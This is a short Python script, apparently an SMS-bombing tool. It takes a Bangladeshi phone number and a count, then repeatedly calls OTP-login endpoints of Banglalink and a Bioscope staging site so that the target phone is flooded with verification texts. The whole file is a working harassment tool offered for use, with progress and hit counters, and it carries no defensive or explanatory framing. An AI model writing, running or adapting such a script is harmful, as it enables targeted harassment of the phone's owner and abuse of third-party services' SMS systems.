import requests as rq
import time

number  = str(input("[>] Enter The BD Number: "))
amount = int(input("[>] Enter The Ammount: "))

sent, nsent = 0, 0

for count in range(1, amount + 1):
  try:
    status = 0
    if number.startswith("014") or number.startswith("019"):
      r = rq.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request", data={"mobile": number})
      status = r.status_code
        
    else:
      url = f"https://stage.bioscopelive.com/en/login/send-otp?phone=88{number}&operator=bd-otp"
      r = rq.get(url)
      status = r.status_code
    
    if status == 200:
      print(f"[✓] {count} SMS Sent.")
    time.sleep(1)
    sent += 1
    count += 1

  except:
      print(f"[×] {count} SMS Not Sent.")
      time.sleep(10)
      count+=1

  count += 1             
            
totalhit  = amount
nsent     = totalhit - sent

print(f"[•] Total Hits : {totalhit}")
print(f"[✓] Total Sent : {sent}")
print(f"[×] Total Not Sent : {nsent}")